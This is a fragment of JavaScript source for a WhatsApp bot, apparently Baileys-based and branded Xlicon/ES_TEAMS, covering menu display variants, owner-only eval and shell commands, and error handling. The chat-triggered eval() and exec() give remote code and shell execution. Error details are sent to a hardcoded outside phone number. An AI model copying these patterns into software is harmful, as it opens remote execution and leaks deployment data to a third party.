  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break
//ALL MENUS CODE END AT HERE

default:
  if (budy.startsWith('>')) {
    if (!XliconTheCreator) return; // Ensure only the bot creator can run this command
    const codeToEvaluate = budy.slice(2).trim(); // Slice and trim the code after the '>' symbol
    if (!codeToEvaluate) return m.reply("❌ No code provided for evaluation.");
  
    try {
      let evaled = await eval(codeToEvaluate); // Evaluate the code synchronously
      if (typeof evaled !== 'string') evaled = require('util').inspect(evaled); // Ensure the result is a string
      await m.reply(evaled); // Send the evaluation result back
    } catch (err) {
      console.error(err); // Log the error for debugging
      await m.reply(`❌ Error in evaluation: ${String(err)}`); // Return the error message to the user
    }
  }
  
  if (budy.startsWith('=>')) {
    if (!XliconTheCreator) return; // Ensure only the bot creator can run this command
    const codeToEvaluate = budy.slice(2).trim(); // Slice and trim the code after the '<' symbol
    if (!codeToEvaluate) return m.reply("❌ No code provided for evaluation.");
  
    try {
      let evaled = await eval(`(async () => { ${codeToEvaluate} })()`); // Execute asynchronous code inside an async function
      if (typeof evaled !== 'string') evaled = require('util').inspect(evaled); // Ensure the result is a string
      await m.reply(evaled); // Send the evaluation result back
    } catch (err) {
      console.error(err); // Log the error for debugging
      await m.reply(`❌ Error in evaluation: ${String(err)}`); // Return the error message to the user
    }
  }
  
const { exec } = require('child_process'); // Import exec

if (budy.startsWith('$')) {
  if (!XliconTheCreator) return; // Ensure only the creator can run commands
  if (!text) return m.reply("❌ Please provide a command to execute.");

  // Slice off the '$' and any extra spaces
  const commandToRun = budy.slice(1).trim(); // trim() to remove extra spaces

  if (!commandToRun) {
    return m.reply("❌ No command provided after $");
  }

  // Execute the command
  exec(commandToRun, (err, stdout, stderr) => {
    if (err) {
      console.error(err); // Log error for debugging
      return m.reply(`❌ Error executing command: ${err.message}`);
    }

    if (stderr) {
      console.error(stderr); // Log any error output from the command
      return m.reply(`❌ Command Error: ${stderr}`);
    }

    if (stdout) {
      console.log(stdout); // Log output for debugging
      return m.reply(`\`\`\`bash\n${stdout}\n\`\`\``); // Send output with code block formatting
    }
  });
}

			if (m.message && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
XliconBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
		}
	} catch (err) {
		console.log(util.format(err))
        let e = String(err)
XliconBotInc.sendMessage("2349037524605@s.whatsapp.net", { text: "🌹 Hello Es Teams Tech, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
